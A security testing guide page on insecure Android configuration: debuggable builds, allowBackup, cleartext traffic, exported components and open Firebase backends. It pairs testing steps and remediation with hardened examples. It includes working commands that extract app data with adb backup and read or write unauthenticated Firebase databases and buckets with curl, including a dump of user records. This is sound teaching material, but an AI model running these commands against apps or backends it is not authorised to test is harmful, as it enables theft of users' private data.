---
title: "Insecure configuration"
description: "Dangerous Android manifest and backend settings: debuggable, allowBackup, cleartext traffic, exported components and exposed Firebase databases and storage buckets."
tags:
  - Android
  - Misconfiguration
  - AndroidManifest
  - Firebase
  - Network Security Config
  - OWASP MASVS
---

# Insecure configuration

!!! danger "Authorised testing only"
    Probe backends such as Firebase only when they belong to an in-scope target. Reading another party's open database is unauthorised access even if it requires no credentials.

## Explanation

Many Android compromises need no bug in the app's logic. A single manifest attribute, a permissive network policy, or an unlocked cloud backend is enough. These settings are usually left over from development, copied from samples, or defaulted by tooling.

| Setting | Risk |
|---------|------|
| `android:debuggable="true"` | Anyone can attach a debugger, use `run-as` to read the sandbox, and execute code in the app's process. |
| `android:allowBackup="true"` (the default on older targets) | `adb backup` copies the app's private data off the device without root. |
| `usesCleartextTraffic="true"` or a permissive `network_security_config` | HTTP traffic and user-installed CAs let a network attacker read or modify data. |
| Exported components | Activities, services, receivers and providers reachable by any app. |
| Exposed backend (Firebase, S3, etc.) | The app is secure but the server-side data store is open to the internet. |

## Exploitation

- **Debuggable build.** `run-as <package>` gives a shell as the app, so the sandbox is readable with no root. A debugger (`jdb`) can attach and run arbitrary code in the process.
- **Backup extraction.** The attacker with USB access and an unlocked, debugging-enabled device runs `adb backup` and unpacks the archive for databases, preferences and files.
- **Cleartext or weak TLS policy.** On shared Wi-Fi the attacker sniffs or tampers with HTTP, and a policy trusting user CAs makes TLS interception trivial.
- **Exported components.** Other apps launch internal activities, query providers or send broadcasts. See [exploiting activities](../exploit-activities.md), [content providers](../exploit-content-providers.md) and [services and receivers](../exploit-services-receivers.md).
- **Open Firebase.** The attacker reads, and often writes, the entire database or bucket with a plain HTTP request, because the security rules allow it.

## Steps

1. **Decode the manifest.**

    ```bash
    apktool d app.apk -o app-src
    grep -nE "debuggable|allowBackup|usesCleartextTraffic|networkSecurityConfig|fullBackupContent|dataExtractionRules" app-src/AndroidManifest.xml
    ```

2. **Check debuggable from the device.**

    ```bash
    adb shell run-as <package> id
    # uid=10xxx(u0_a1xx) means debuggable. "package not debuggable" means not
    adb shell dumpsys package <package> | grep -iE "flags=|DEBUGGABLE"
    ```

3. **Test backup extraction.**

    ```bash
    adb backup -f backup.ab -noapk <package>      # confirm the prompt on the device
    dd if=backup.ab bs=24 skip=1 2>/dev/null | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > backup.tar
    tar -tvf backup.tar
    tar -xf backup.tar && ls apps/<package>/
    ```

    (Alternatively use `abe.jar`: `java -jar abe.jar unpack backup.ab backup.tar`.) An empty archive means backup is disabled or excluded.

4. **Review the network policy.**

    ```bash
    cat app-src/res/xml/network_security_config.xml
    ```

    Flag `cleartextTrafficPermitted="true"`, `<certificates src="user" />` in release, and missing pinning on sensitive domains. Then confirm with [proxy certificates](../proxy-certificates.md): if traffic is visible without installing a CA in the system store, TLS is weak.

5. **Enumerate exported components.**

    ```bash
    grep -nE "exported=\"true\"|<intent-filter" app-src/AndroidManifest.xml
    adb shell dumpsys package <package> | grep -A3 -iE "Activity Resolver|Service Resolver|Receiver Resolver"
    ```

    Remember that components with an `<intent-filter>` and no explicit `exported` attribute are exported on targets below Android 12.

6. **Find backend endpoints and Firebase config.**

    ```bash
    jadx -d out/ app.apk
    grep -rnE "firebaseio\.com|firebasestorage|googleapis\.com|storage\.googleapis" out/resources/res/values/strings.xml out/sources/
    # google-services values land in strings.xml: firebase_database_url, google_api_key, google_storage_bucket
    ```

7. **Test an open Realtime Database (unauthenticated read, then write on a test node).**

    ```bash
    curl -s "https://<project>.firebaseio.com/.json"
    curl -s "https://<project>.firebaseio.com/.json?shallow=true"
    # Write test (only where permitted by scope). Use a clearly named marker node
    curl -s -X PUT "https://<project>.firebaseio.com/pentest-marker.json" -d '"authorised-test"'
    ```

    A `{"error":"Permission denied"}` response means the rules are enforced. Data returned means the database is open.

8. **Test an open Storage bucket and Firestore.**

    ```bash
    curl -s "https://firebasestorage.googleapis.com/v0/b/<project>.appspot.com/o"
    curl -s "https://firestore.googleapis.com/v1/projects/<project>/databases/(default)/documents/<collection>"
    ```

## Remediation

- **Release builds.** Ship with `android:debuggable="false"` (Gradle release builds do this by default; do not hardcode `true` in the manifest).
- **Backups.** Set `android:allowBackup="false"`, or on Android 12+ use `android:dataExtractionRules` and `android:fullBackupContent` to exclude sensitive files and prefer end-to-end encrypted backup.
- **Network.** Set `android:usesCleartextTraffic="false"` and use a `network_security_config` with `cleartextTrafficPermitted="false"`. Trust only the system store in release, and add certificate pinning for sensitive domains. Limit debug-only trust anchors with `<debug-overrides>`.
- **Components.** Set `android:exported="false"` by default. Export only what must be public, and protect it with a signature-level `android:permission`. Validate all incoming intent data.
- **Backends.** Write Firebase Security Rules that deny by default and require `request.auth != null` plus per-user ownership checks. Restrict API keys by package name and SHA-1 and by API. Audit buckets for public listing. Test rules in the Firebase emulator.
- **Pipeline.** Add a manifest lint and a backend rules check to CI so these settings cannot regress.

## Example

### Vulnerable manifest

```xml
<application
    android:allowBackup="true"
    android:debuggable="true"
    android:usesCleartextTraffic="true"
    android:label="@string/app_name">

    <activity android:name=".AdminActivity">
        <intent-filter>
            <action android:name="<package>.ADMIN" />
        </intent-filter>
    </activity>
</application>
```

A matching open Firebase ruleset:

```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

### Exploit

Extract private data with `adb backup`, no root needed.

```bash
adb backup -f backup.ab -noapk <package>
java -jar abe.jar unpack backup.ab backup.tar
tar -xf backup.tar
cat apps/<package>/sp/session.xml
sqlite3 apps/<package>/db/app.db "SELECT * FROM users;"
```

Read the open backend directly:

```bash
curl -s "https://<project>.firebaseio.com/users.json"
```

!!! failure "Result"
    The backup yields the preferences and database in plaintext, `run-as <package>` works on the same device, and the open ruleset returns every user record to an unauthenticated request.

### Hardened manifest

```xml
<application
    android:allowBackup="false"
    android:dataExtractionRules="@xml/data_extraction_rules"
    android:fullBackupContent="@xml/backup_rules"
    android:usesCleartextTraffic="false"
    android:networkSecurityConfig="@xml/network_security_config"
    android:label="@string/app_name">

    <activity
        android:name=".AdminActivity"
        android:exported="false" />
</application>
```

`res/xml/network_security_config.xml`:

```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
</network-security-config>
```

Firebase rules that require authentication and ownership:

```json
{
  "rules": {
    "users": {
      "$uid": {
        ".read": "auth != null && auth.uid === $uid",
        ".write": "auth != null && auth.uid === $uid"
      }
    }
  }
}
```

!!! success "Verified"
    `adb backup` produces an empty archive, `run-as <package>` reports `not debuggable`, HTTP requests fail, and the unauthenticated `curl` against Firebase returns `Permission denied`.
